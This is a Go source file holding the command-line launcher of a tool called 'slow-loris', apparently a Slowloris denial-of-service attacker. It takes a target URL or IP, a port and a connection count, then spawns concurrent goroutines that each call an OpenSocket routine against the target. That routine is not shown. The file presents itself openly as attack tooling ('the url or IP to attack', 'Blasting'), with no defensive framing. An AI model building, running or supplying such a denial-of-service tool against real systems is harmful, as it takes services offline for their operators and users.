package main
import (
	"fmt"
	"flag"
	"os"
	"sync"
	"runtime"
)

func printUsage() {
	flag.Usage()
	fmt.Println("Example: slow-loris -u https://test.com -p 443 -c 500")
	os.Exit(1)
}

func main() {
	runtime.GOMAXPROCS(4)
	var defaultPort string = "80"
	var defaultConnections int = 100

	// This is limited by https://www.tecmint.com/increase-set-open-file-limits-in-linux/
	var defaultLimit = 10

	url := flag.String("u", "nil", "This is the url or IP to attack")
	port := flag.String("p", defaultPort, "This is the port that is attacked")
	connections := flag.Int("c", defaultConnections, "This is the number of concurrent connections")
	limit := flag.Int("l", defaultLimit, "Number of requests for each concurrent connection (ie with -c 10 and -l 10 there would be a total of 100 requests sent")

	flag.Parse()

	if flag.NFlag() == 0 {
		printUsage()
	}

	if *url == "nil" {
		panic("URL is required")
	}

	fmt.Printf("Blasting %v on port %v with %v concurrent connections making %v requests each\n", *url, *port, *connections, *limit)
	var wg sync.WaitGroup
	for threads := 0; threads < *connections; threads++ {
		wg.Add(1)
		go func(threads int){
			// fmt.Println(threads)
			OpenSocket(*url, *port, *limit, threads)
			wg.Done()
		}(threads)
	}
	wg.Wait()
	fmt.Printf("Finished requesting %v\n", *url)
	os.Exit(0)
}